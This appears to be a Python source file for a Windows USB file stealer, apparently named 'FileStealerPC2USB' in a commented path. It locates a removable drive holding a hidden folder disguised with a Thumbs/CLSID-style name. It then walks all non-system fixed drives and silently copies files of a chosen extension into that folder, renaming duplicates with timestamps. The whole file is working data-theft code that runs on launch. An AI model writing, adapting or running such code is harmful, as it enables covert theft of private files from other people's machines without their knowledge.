from os import walk,chdir,listdir , sep,environ
from shutil import copyfile
from time import localtime
from win32api import GetLogicalDrives
from win32file import GetDriveType, DRIVE_FIXED, DRIVE_REMOVABLE

class Mains:
    def usb_finder(self):
        self.usb_list = []
        drivebits = GetLogicalDrives()
        for d in range(1, 26):
            mask = 1 << d
            if drivebits & mask:
                drname = '%c:\\' % chr(ord('A') + d)
                t = GetDriveType(drname)
                if t == DRIVE_REMOVABLE:
                    self.usb_list.append(drname)

        for usb in self.usb_list:
            chdir(usb)
            if ".Thumbs.ms.{2227a280-3aea-1069-a2de-08002b30309d}" in listdir('.'):
                self.dest = usb + "\\.Thumbs.ms.{2227a280-3aea-1069-a2de-08002b30309d}\\"
                # print(self.dest)

    def drives(self):
        win = environ['SYSTEMDRIVE'] + "\\"

        self.drive_list = []
        drivebits = GetLogicalDrives()
        for d in range(1, 26):
            mask = 1 << d
            if drivebits & mask:
                drname = '%c:\\' % chr(ord('A') + d)
                t = GetDriveType(drname)
                if t == DRIVE_FIXED:
                    self.drive_list.append(drname)
        for i in self.drive_list:
            if i == win :
                self.drive_list.remove(i)

    def copier(self):
        for driver in self.drive_list :
            chdir(driver)

            filetype = '.bmpsa'

            # destination = "D:\\MY Projects\\Python\\FileStealerPC2USB\\n\\"

            for (dirpath, dirname, filenames) in walk('.'):
                for filename in filenames:
                    if filename.endswith(filetype):
                        main_location = sep.join([dirpath,filename])

                        timemin = str(localtime().tm_min)
                        timesec = str(localtime().tm_sec)

                        time = "_m" + timemin + "-s" + timesec

                        if filename in listdir(self.dest) :
                            filename = filename.replace(filetype,"")
                            copyfile(main_location, self.dest + filename + time + filetype)
                            # print("ok")
                        else:
                                copyfile(main_location, self.dest + filename)

M = Mains()
M.usb_finder()
M.drives()
M.copier()






        # print(timesec)

    # print(lister)

        # for file in f:
        #     timemin = str(localtime().tm_min)
        #     timesec = str(localtime().tm_sec)
        #
        #     # print(timesec)
        #     time ="m" + timemin+ "-s"+timesec
        #
        #     if file in listdir(destination) :
        #         copyfile(file, destination + file + time)
        #         print("ok")
        #     else:
        #         copyfile(file, destination + file)
                # print("no")
        # for dir in d:
        #     if dir in "n" :
        #         copytree(dir, "n\\" + dir + str(time.localtime().tm_min) , str(time.localtime().tm_sec))
        #     else:
        #         copytree(dir, "n\\" + dir)

# print(dirs)
# print(files)
